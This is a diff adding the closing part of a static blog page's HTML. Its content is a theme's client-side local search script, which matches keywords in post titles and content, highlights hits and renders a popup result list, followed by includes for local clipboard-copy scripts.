+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+</body>
+</html>
